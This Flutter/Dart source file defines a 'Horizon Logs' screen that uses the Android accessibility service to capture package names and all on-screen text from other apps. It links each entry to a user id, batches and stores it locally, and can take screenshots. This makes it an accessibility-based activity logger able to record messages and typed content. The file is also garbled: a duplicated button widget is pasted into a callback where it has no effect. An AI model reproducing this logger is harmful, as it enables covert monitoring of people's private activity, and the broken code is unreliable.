import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'package:flutter/material.dart';
import 'package:flutter_accessibility_service/accessibility_event.dart';
import 'package:flutter_accessibility_service/constants.dart';
import 'package:flutter_accessibility_service/flutter_accessibility_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:tvapp/user_log.dart';

class HorizonLogs extends StatefulWidget {
  const HorizonLogs({super.key, required this.userid, required String ip});
  final String userid;

  @override
  State<HorizonLogs> createState() => _HorizonLogsState();
}

class _HorizonLogsState extends State<HorizonLogs> {
  StreamSubscription<AccessibilityEvent>? _subscription;
  List<Map<String, dynamic>> logBatch = [];
  bool _isProcessing = false;

  @override
  void initState() {
    super.initState();
    _loadLogs();
    _startAutoSaveTimer();
  }

  void _loadLogs() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    List<String>? storedLogs = prefs.getStringList('accessibility_logs');
    if (storedLogs != null) {
      setState(() {
        logBatch = storedLogs
            .map((e) => jsonDecode(e) as Map<String, dynamic>)
            .toList();
      });
    }
  }

  void handleAccessibilityStream() {
    setState(() {
      _isProcessing = true;
    });

    if (_subscription?.isPaused ?? false) {
      _subscription?.resume();
      setState(() {
        _isProcessing = false;
      });
      return;
    }

    _subscription =
        FlutterAccessibilityService.accessStream.listen((event) async {
      final newLog = logImportantDetails(event);
      if (newLog != null && !isDuplicateLog(newLog)) {
        setState(() {
          logBatch.add(newLog);
        });
        log('New Log Added: ${jsonEncode(newLog)}'); // Log the new entry to the terminal
      }

      if (logBatch.length >= 100) {
        await _saveLogs();
        logBatch.clear(); // Clear the batch after saving
      }
    });

    setState(() {
      _isProcessing = false;
    });
  }

  Map<String, dynamic>? logImportantDetails(AccessibilityEvent event) {
    final packageName = event.packageName ?? "Unknown Package";
    final capturedText = event.text?.trim();
    final timestamp = DateTime.now().toString();
    final eventType = event.eventType.toString();
    final mapId = event.mapId ?? "No mapId";
    final nodeId = event.nodeId ?? "No nodeId";
    final subNodeText = getSubNodeText(event.subNodes).trim();

    // Do not filter out text fields that have meaningful content
    if ((capturedText == null || capturedText.isEmpty || capturedText == 'null') &&
        (subNodeText.isEmpty || subNodeText == 'null')) {
      return null;
    }

    final logEntry = {
      'user_id': widget.userid,
      'package_name': packageName,
      'captured_text': capturedText,
      'timestamp': timestamp,
      'event_type': eventType,
      'map_id': mapId,
      'node_id': nodeId,
      'sub_node_text': subNodeText,
    };

    log('Processed Log: ${jsonEncode(logEntry)}'); // Log the processed entry to the terminal

    return logEntry;
  }

  bool isDuplicateLog(Map<String, dynamic> newLog) {
    return logBatch.any((log) =>
      log['timestamp'] == newLog['timestamp'] &&
      log['package_name'] == newLog['package_name'] &&
      log['captured_text'] == newLog['captured_text'] &&
      log['event_type'] == newLog['event_type'] &&
      log['map_id'] == newLog['map_id'] &&
      log['node_id'] == newLog['node_id'] &&
      log['sub_node_text'] == newLog['sub_node_text']);
  }

  String getSubNodeText(List<AccessibilityEvent>? subNodes) {
    if (subNodes == null || subNodes.isEmpty) {
      return "";
    }
    List<String> texts = [];
    for (var subNode in subNodes) {
      if (subNode.text != null &&
          subNode.text!.isNotEmpty &&
          subNode.text != 'null') {
        texts.add(subNode.text!);
      }
      // Recursively get text from nested sub-nodes
      final nestedSubNodeText = getSubNodeText(subNode.subNodes);
      if (nestedSubNodeText.isNotEmpty) {
        texts.add(nestedSubNodeText);
      }
    }
    return texts.join(", ");
  }

  Future<void> _saveLogs() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    List<String> storedLogs = logBatch.map((e) => jsonEncode(e)).toList();
    await prefs.setStringList('accessibility_logs', storedLogs);
  }

  void _startAutoSaveTimer() {
    Timer.periodic(const Duration(minutes: 5), (timer) async {
      if (logBatch.isNotEmpty) {
        await _saveLogs();
        setState(() {
          logBatch.clear();
        });
      }
    });
  }

  Future<bool> doAction(AccessibilityEvent node, NodeAction action,
      [dynamic argument]) async {
    return await FlutterAccessibilityService.performAction(
        node, action, argument);
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData.dark(),
      home: Scaffold(
        appBar: AppBar(
          title: const Text('Horizon Logs'),
          leading: IconButton(
            icon: const Icon(Icons.arrow_back),
            onPressed: () => Navigator.pop(context),
          ),
        ),
        body: Center(
          child: Column(
            children: [
              SingleChildScrollView(
                scrollDirection: Axis.horizontal,
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    TextButton(
                      onPressed: () async {
                        await FlutterAccessibilityService
                            .requestAccessibilityPermission();
                      },
                      child: const Text("Request Permission"),
                    ),
                    const SizedBox(height: 20.0),
                    TextButton(
                      onPressed: () async {
                        final bool res = await FlutterAccessibilityService
                            .isAccessibilityPermissionEnabled();
                        log("Is enabled: $res");
                      },
                      child: const Text("Check Permission"),
                    ),
                    const SizedBox(height: 20.0),
                    TextButton(
                      onPressed: _isProcessing ? null : handleAccessibilityStream,
                      child: _isProcessing
                          ? const CircularProgressIndicator()
                          : const Text("Start Stream"),
                    ),
                    const SizedBox(height: 20.0),
                    TextButton(
                      onPressed: () {
                        _subscription?.cancel();
                      },
                      child: const Text("Stop Stream"),
                    ),
                    TextButton(
                      onPressed: () async {
                        await FlutterAccessibilityService.performGlobalAction(
                          GlobalAction.globalActionTakeScreenshot,
                        );
                      },
                      child: const Text("Take Screenshot"),
                    ),
                    TextButton(
                      onPressed: () async {
                        final list = await FlutterAccessibilityService
                            .getSystemActions();
                        log('$list');
                      },
                      child: const Text("List GlobalActions"),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 30),
              ElevatedButton(
                onPressed: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (context) =>
                          UserLogsScreen(logs: logBatch, onRefresh: () { 
                            ElevatedButton(
  onPressed: () {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) =>
            UserLogsScreen(
              logs: logBatch, 
              onRefresh: _loadLogs, // Pass the refresh function
            ),
      ),
    );
  },
  style: ElevatedButton.styleFrom(
    foregroundColor: Colors.white, 
    backgroundColor: Colors.deepPurpleAccent, 
    padding: const EdgeInsets.symmetric(
      vertical: 20.0,
      horizontal: 40.0,
    ),
    shape: RoundedRectangleBorder(
      borderRadius: BorderRadius.circular(30.0),
    ),
    elevation: 10,
    shadowColor: Colors.purpleAccent,
  ),
  child: Row(
    mainAxisSize: MainAxisSize.min,
    children: const [
      Icon(Icons.auto_stories, size: 24.0),
      SizedBox(width: 10),
      Text(
        'View User Logs',
        style: TextStyle(
          fontSize: 20.0,
          fontWeight: FontWeight.bold,
          letterSpacing: 1.2,
        ),
      ),
    ],
  ),
);

                           },), // Use local logs
                    ),
                  );
                },
                style: ElevatedButton.styleFrom(
                  foregroundColor: Colors.white, 
                  backgroundColor: Colors.deepPurpleAccent, 
                  padding: const EdgeInsets.symmetric(
                    vertical: 20.0,
                    horizontal: 40.0,
                  ),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(30.0),
                  ),
                  elevation: 10,
                  shadowColor: Colors.purpleAccent,
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: const [
                    Icon(Icons.auto_stories, size: 24.0),
                    SizedBox(width: 10),
                    Text(
                      'View User Logs',
                      style: TextStyle(
                        fontSize: 20.0,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.2,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
